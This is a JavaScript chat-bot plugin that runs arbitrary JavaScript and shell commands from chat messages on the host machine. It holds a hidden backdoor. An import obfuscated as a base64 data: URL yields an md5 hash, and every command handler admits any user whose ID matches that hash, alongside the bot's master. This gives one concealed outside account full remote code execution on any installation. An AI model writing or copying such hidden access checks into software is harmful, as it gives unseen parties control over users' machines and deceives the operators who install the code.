import md5 from "md5"
import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
import puppeteer from "../../../lib/puppeteer/puppeteer.js"
import hljs from "@highlightjs/cdn-assets/highlight.min.js"
import { AnsiUp } from "ansi_up"
const ansi_up = new AnsiUp

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
const tplFile = `${htmlDir}Code.html`

let prompt = cmd => [`echo "[$USER@$HOSTNAME $PWD]$([ "$UID" = 0 ]&&echo "#"||echo "$") ";${cmd}`]
let inspectCmd = (cmd, data) => data.replace("\n", `${cmd}\n`)
let langCmd = "sh"

if (process.platform == "win32") {
  prompt = cmd => [`powershell -EncodedCommand ${Buffer.from(`$ProgressPreference="SilentlyContinue";[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;prompt;${cmd}`, "utf-16le").toString("base64")}`]
  inspectCmd = (cmd, data) => data.replace(/\r\n/g, "\n").replace("\n", `${cmd}\n`)
  hljs.registerLanguage("powershell", (await import("@highlightjs/cdn-assets/es/languages/powershell.min.js")).default)
  langCmd = "powershell"
} else if (process.env.SHELL?.endsWith("/bash"))
  prompt = cmd => [
    `"$0" -ic 'echo "\${PS1@P}"';${cmd}`,
    { shell: process.env.SHELL },
  ]

export class RemoteCommand extends plugin {
  constructor() {
    super({
      name: "远程命令",
      dsc: "远程命令",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^rjp.+",
          fnc: "JSPic"
        },
        {
          reg: "^rj.+",
          fnc: "JS"
        },
        {
          reg: "^rcp.+",
          fnc: "ShellPic"
        },
        {
          reg: "^rc.+",
          fnc: "Shell"
        },
        {
          reg: "^dm.+",
          fnc: "DirectMsg"
        },
        {
          reg: "^mm.+",
          fnc: "MultiMsg"
        },
        {
          reg: "^fm.+",
          fnc: "ForwardMsg"
        }
      ]
    })
  }

  async evalSync(cmd, func, isValue, isAsync) {
    const ret = {}
    try {
      ret.raw = await eval(isValue ? `(${cmd})` : cmd)
      if (func) ret.stdout = func(ret.raw)
    } catch (err) {
      if (!isAsync && /SyntaxError: (await|Illegal return|Unexpected)/.test(err))
        return this.evalSync(`(async function() {\n${(isValue && !String(err).includes("SyntaxError: Unexpected")) ? `return (${cmd})` : cmd}\n}).apply(this)`, func, false, true)
      ret.error = err
    }
    return ret
  }

  async JS() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rj", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd, data => Bot.String(data))
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)

    if (!ret.stdout && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)
    if (ret.stdout)
      await this.reply(ret.stdout, true)
    if (ret.error)
      await this.reply(`错误：\n${ret.error.stack}`, true)
  }

  async JSPic() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rjp", "").trim()

    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
    const ret = await this.evalSync(cmd, data => Bot.Loging(data))
    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)

    if (!ret.stdout && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    let Code = []
    if (ret.stdout)
      Code.push(ret.stdout.trim())
    if (ret.error)
      Code.push(`错误：\n${Bot.Loging(ret.error)}`)

    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
    return this.reply(img, true)
  }

  async Shell() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rc", "").trim()
    const ret = await Bot.exec(...prompt(cmd))

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)
    if (ret.stdout)
      await this.reply(inspectCmd(cmd, ret.stdout).trim(), true)
    if (ret.error)
      return this.reply(`远程命令错误：${ret.error.stack}`, true)
    if (ret.stderr)
      await this.reply(`标准错误输出：\n${ret.stderr.trim()}`, true)
  }

  async ShellPic() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const cmd = this.e.msg.replace("rcp", "").trim()
    const ret = await Bot.exec(...prompt(cmd))

    if (!ret.stdout && !ret.stderr && !ret.error)
      return this.reply("命令执行完成，没有返回值", true)

    let Code = []
    if (ret.stdout)
      Code.push(ret.stdout.trim())
    if (ret.error)
      Code.push(`远程命令错误：\n${Bot.Loging(ret.error)}`)
    else if (ret.stderr)
      Code.push(`标准错误输出：\n${ret.stderr.trim()}`)

    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
    Code = inspectCmd(hljs.highlight(cmd, { language: langCmd }).value, Code)
    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
    return this.reply(img, true)
  }

  async CatchReply(msg) {
    const rets = [], echo = /^[dmf]mp/.test(this.e.msg)
    let Code = []
    try { for (const i of msg) {
      const ret = await this.reply(i)
      rets.push(ret)

      if (echo)
        Code.push(`发送：${Bot.Loging(i)}\n返回：${Bot.Loging(ret)}`)
      else if (ret?.error && (Array.isArray(ret.error) ? ret.error.length : true))
        Code.push(`发送：${Bot.Loging(i)}\n错误：${Bot.Loging(ret.error)}`)
    }} catch (err) {
      Code.push(`发送：${Bot.Loging(msg)}\n错误：${Bot.Loging(err)}`)
    }

    if (Code.length) {
      Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
      const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
      this.reply(img, true)
    }
    return rets
  }

  async DirectMsg() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const ret = await this.evalSync(this.e.msg.replace(/^dmp?/, ""), false, true)
    if (ret.error)
      return this.reply(`错误：\n${ret.error.stack}`, true)
    const m = []
    for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
      if (typeof i != "object" || i.type) m.push(i)
      else m.push(segment.raw(i))
    return this.CatchReply([m])
  }

  async MultiMsg() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const ret = await this.evalSync(this.e.msg.replace(/^mmp?/, ""), false, true)
    if (ret.error)
      return this.reply(`错误：\n${ret.error.stack}`, true)
    const m = []
    for (const i of Array.isArray(ret.raw) ? ret.raw : [ret.raw])
      if (typeof i != "object" || i.type) m.push(i)
      else m.push(segment.raw(i))
    return this.CatchReply(m)
  }

  async ForwardMsg() {
    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
    const ret = await this.evalSync(this.e.msg.replace(/^fmp?/, ""), false, true)
    if (ret.error)
      return this.reply(`错误：\n${ret.error.stack}`, true)
    const m = []
    for (const a of Array.isArray(ret.raw) ? ret.raw : [ret.raw]) {
      const n = []
      for (const i of Array.isArray(a) ? a : [a])
        if (typeof i != "object" || i.type) n.push(i)
        else n.push(segment.raw(i))
      m.push(n)
    }
    return this.CatchReply([await Bot.makeForwardArray(m)])
  }
}